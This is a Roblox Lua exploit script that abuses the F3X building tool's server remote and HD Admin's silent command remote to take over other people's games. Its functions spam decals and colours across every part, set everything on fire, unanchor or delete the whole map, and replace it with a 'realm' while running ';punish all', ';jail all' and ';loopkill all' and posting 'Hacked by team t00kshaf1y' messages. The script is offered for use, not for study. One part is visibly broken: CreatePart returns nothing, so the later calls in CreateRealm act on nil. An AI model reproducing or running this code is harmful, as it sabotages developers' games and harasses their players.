-- Scripts:

local function KHLZ_fake_script() -- Frame.LocalScript 
    local script = Instance.new('LocalScript', Frame)

    local UserInputService = game:GetService("UserInputService")
    
    local gui = script.Parent
    
    local dragging
    local dragInput
    local dragStart
    local startPos
    
    local function update(input)
        local delta = input.Position - dragStart
        gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
    
    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
    
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end
end
coroutine.wrap(KHLZ_fake_script)()

-- F3X API Functions
local function getF3XTool()
    local player = game.Players.LocalPlayer
    local char = player.Character
    local backpack = player.Backpack
    
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then
            return v
        end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then
            return v
        end
    end
    return nil
end

local f3x = getF3XTool()
local remote = f3x and f3x.SyncAPI.ServerEndpoint

local function f3xInvoke(args)
    if remote then
        remote:InvokeServer(unpack(args))
    end
end

-- F3X Building Functions
local function SetCollision(part, boolean)
    local args = {
        [1] = "SyncCollision",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CanCollide"] = boolean
            }
        }
    }
    f3xInvoke(args)
end

local function SetAnchor(boolean, part)
    local args = {
        [1] = "SyncAnchor",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Anchored"] = boolean
            }
        }
    }
    f3xInvoke(args)
end

local function CreatePart(cf, parent, partType)
    local args = {
        [1] = "CreatePart",
        [2] = partType or "Normal",
        [3] = cf,
        [4] = parent
    }
    f3xInvoke(args)
end

local function DestroyPart(part)
    local args = {
        [1] = "Remove",
        [2] = {
            [1] = part
        }
    }
    f3xInvoke(args)
end

local function Resize(part, size, cf)
    local args = {
        [1] = "SyncResize",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CFrame"] = cf,
                ["Size"] = size
            }
        }
    }
    f3xInvoke(args)
end

local function AddMesh(part)
    local args = {
        [1] = "CreateMeshes",
        [2] = {
            [1] = {
                ["Part"] = part
            }
        }
    }
    f3xInvoke(args)
end

local function SetMesh(part, meshid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["MeshId"] = "rbxassetid://"..meshid
            }
        }
    }
    f3xInvoke(args)
end

local function SetTexture(part, texid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["TextureId"] = "rbxassetid://"..texid
            }
        }
    }
    f3xInvoke(args)
end

local function SetName(part, stringg)
    local args = {
        [1] = "SetName",
        [2] = {
            [1] = part
        },
        [3] = stringg
    }
    f3xInvoke(args)
end

local function MeshResize(part, size)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Scale"] = size
            }
        }
    }
    f3xInvoke(args)
end

local function SetLocked(part, boolean)
    local args = {
        [1] = "SetLocked",
        [2] = {
            [1] = part
        },
        [3] = boolean
    }
    f3xInvoke(args)
end

local function SetTrans(part, int)
    local args = {
        [1] = "SyncMaterial",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Transparency"] = int
            }
        }
    }
    f3xInvoke(args)
end

local function Color(part, color)
    local args = {
        [1] = "SyncColor",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Color"] = color,
                ["UnionColoring"] = false
            }
        }
    }
    f3xInvoke(args)
end

local function SpawnDecal(part, side)
    local args = {
        [1] = "CreateTextures",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Face"] = side,
                ["TextureType"] = "Decal"
            }
        }
    }
    f3xInvoke(args)
end

local function AddDecal(part, asset, side)
    local args = {
        [1] = "SyncTexture",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Face"] = side,
                ["TextureType"] = "Decal",
                ["Texture"] = "rbxassetid://".. asset
            }
        }
    }
    f3xInvoke(args)
end

local function SpawnTexture(part, side)
    local args = {
        [1] = "CreateTextures",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Face"] = side,
                ["TextureType"] = "Texture"
            }
        }
    }
    f3xInvoke(args)
end

local function AddTexture(part, asset, side)
    local args = {
        [1] = "SyncTexture",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Face"] = side,
                ["TextureType"] = "Texture",
                ["Texture"] = "rbxassetid://".. asset
            }
        }
    }
    f3xInvoke(args)
end

local function AddFire(part)
    local args = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Fire"
            }
        }
    }
    f3xInvoke(args)
end

-- HD Admin Functions
local function HDAdminCommand(command)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(command)
end

-- Skybox Functions
local function Sky(id)
    local player = game.Players.LocalPlayer
    local char = player.Character
    local e = math.floor(char.HumanoidRootPart.CFrame.x)
    local f = math.floor(char.HumanoidRootPart.CFrame.y)
    local g = math.floor(char.HumanoidRootPart.CFrame.z)
    
    CreatePart(CFrame.new(e, f, g) + Vector3.new(0,6,0), workspace)
    
    for i,v in game.Workspace:GetDescendants() do
        if v:IsA("BasePart") and v.CFrame.x == e and v.CFrame.z == g then
            SetName(v,"Sky")
            AddMesh(v)
            SetMesh(v,"111891702759441")
            SetTexture(v,id)
            MeshResize(v,Vector3.new(99999,99999,99999))
            SetLocked(v,true)
        end
    end
end

-- Decal Spam Functions
local function DecalSpam(id)
    for i,v in game.workspace:GetDescendants() do
        if v:IsA("BasePart") then
            spawn(function()
                SetLocked(v,false)
                SpawnDecal(v,Enum.NormalId.Front)
                AddDecal(v,id,Enum.NormalId.Front)
                SpawnDecal(v,Enum.NormalId.Back)
                AddDecal(v,id,Enum.NormalId.Back)
                SpawnDecal(v,Enum.NormalId.Right)
                AddDecal(v,id,Enum.NormalId.Right)
                SpawnDecal(v,Enum.NormalId.Left)
                AddDecal(v,id,Enum.NormalId.Left)
                SpawnDecal(v,Enum.NormalId.Bottom)
                AddDecal(v,id,Enum.NormalId.Bottom)
                SpawnDecal(v,Enum.NormalId.Top)
                AddDecal(v,id,Enum.NormalId.Top)
            end)
        end
    end 
end

-- Texture Spam Functions
local function TextureSpam(id)
    for i,v in game.workspace:GetDescendants() do
        if v:IsA("BasePart") then
            spawn(function()
                SetLocked(v,false)
                SpawnTexture(v,Enum.NormalId.Front)
                AddTexture(v,id,Enum.NormalId.Front)
                SpawnTexture(v,Enum.NormalId.Back)
                AddTexture(v,id,Enum.NormalId.Back)
                SpawnTexture(v,Enum.NormalId.Right)
                AddTexture(v,id,Enum.NormalId.Right)
                SpawnTexture(v,Enum.NormalId.Left)
                AddTexture(v,id,Enum.NormalId.Left)
                SpawnTexture(v,Enum.NormalId.Bottom)
                AddTexture(v,id,Enum.NormalId.Bottom)
                SpawnTexture(v,Enum.NormalId.Top)
                AddTexture(v,id,Enum.NormalId.Top)
            end)
        end
    end 
end

-- Color Spam Functions
local function RandomColorSpam()
    for i,v in game.Workspace:GetDescendants() do
        if v:IsA("BasePart") then
            spawn(function()
                SetLocked(v,false)
                Color(v,Color3.new(math.random(0,255)/255, math.random(0,255)/255, math.random(0,255)/255))
            end)
        end
    end
end

-- Fire All Function
local function FireAll()
    for i,v in game.Workspace:GetDescendants() do
        spawn(function()
            SetLocked(v,false)
            AddFire(v)
        end)
    end
end

-- Unanchor All Function
local function UnanchorAll()
    for i,v in game.Workspace:GetDescendants() do
        spawn(function()
            SetLocked(v,false)
            SetAnchor(false,v)
        end)
    end
end

-- Destroy All Function
local function DestroyAll()
    for i,v in game.Workspace:GetDescendants() do
        if v:IsA("BasePart") then
            spawn(function()
                DestroyPart(v)
            end)
        end
    end
end

-- Baseplate Function
local function CreateBaseplate()
    local player = game.Players.LocalPlayer
    local char = player.Character
    local hrpx = math.floor(char.HumanoidRootPart.CFrame.x)
    local hrpz = math.floor(char.HumanoidRootPart.CFrame.z)
    local hrpy = math.floor(char.HumanoidRootPart.CFrame.y)
    
    CreatePart(CFrame.new(hrpx,hrpy-20,hrpz),workspace,"Spawn")
    
    for i,v in game.Workspace:GetChildren() do
        if v:IsA("BasePart") and v.CFrame.y == hrpy - 20 and v.CFrame.x == hrpx then
            spawn(function()
                Resize(v,Vector3.new(700,2,700),CFrame.new(hrpx,hrpy-20,hrpz))
                Color(v,Color3.fromRGB(55,55,55))
                SpawnTexture(v,Enum.NormalId.Top)
                AddTexture(v,"0",Enum.NormalId.Top)
                while wait(1) do
                    pcall(function() SetLocked(v,true) end)
                end
            end)
        end
    end
end

local function CreateRealm()
    HDAdminCommand(";btools me")
    HDAdminCommand(";sm Team t00kshaf1y join now!!")
    wait(0.6)
    HDAdminCommand(";fogcolor black")
    wait(0.5)
    HDAdminCommand(";punish all")
    HDAdminCommand(";m Hacked by us")
    wait(0.1)
    HDAdminCommand(";sh You are about to go to our realm!!")
      
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") or v:IsA("UnionOperation") then
            spawn(function()
                DestroyPart(v)
            end)
        end
    end
    
    wait(1)
    
    local position = CFrame.new(0, 5, 0)
    local base = CreatePart(position, workspace, "Normal")
    Resize(base, Vector3.new(512, 16, 512), position)
    Color(base, Color3.fromRGB(100, 100, 100))
    SetName(base, "RealmBase")
    SetLocked(base, true)
    
    local spawnpos = CFrame.new(34.5, 8.1, -26)
    local spawna = CreatePart(spawnpos, workspace, "Spawn")
    Resize(spawna, Vector3.new(20, 10, 20), spawnpos)
    SetName(spawna, "SpawnLocation")
    SetLocked(spawna, true)
    
    local skyPosition = CFrame.new(0, 5, 0)
    local sky = CreatePart(skyPosition, workspace, "Normal")
    AddMesh(sky)
    SetMesh(sky, "111891702759441")
    SetTexture(sky, "118953088842031")
    MeshResize(sky, Vector3.new(99999, 99999, 99999))
    SetLocked(sky, true)
    SetName(sky, "Skybox")
    SetCollision(sky, false)

    HDAdminCommand(";res all")
    wait(0.3)
    HDAdminCommand(";r6 all")
    HDAdminCommand(";blur all")
    wait(2.8)
    HDAdminCommand(";fog")
    HDAdminCommand(";sh This is the realm of team T00kshaf1y!")
    HDAdminCommand(";disco")
    HDAdminCommand(";n Team t00kshaf1y join now!!")
    wait(2.0)
    HDAdminCommand(";alert all Welcome to our team's realm!!")
    HDAdminCommand(";fire all")
    HDAdminCommand(";dog all")
    wait(1.6)
    HDAdminCommand(";title me t00kshaf1y")
    HDAdminCommand(";name all t00kshaf1y")
    wait(2.0)
    HDAdminCommand(";time 23")
    HDAdminCommand(";music 1847661821 ;volume inf ;pitch 1.1")
    wait(5.0)
    HDAdminCommand(";char all ttsghdvhfc2")
    HDAdminCommand(";freeze all")
    HDAdminCommand(";sh hacked by team t00kshaf1y")
    HDAdminCommand(";sm This game was destroyed by us!")    
    wait(3.0)
    HDAdminCommand(";jail all")
    HDAdminCommand(";sh lol")
    HDAdminCommand(";loopkill all")
    
    print("Realm creation completed!")
end

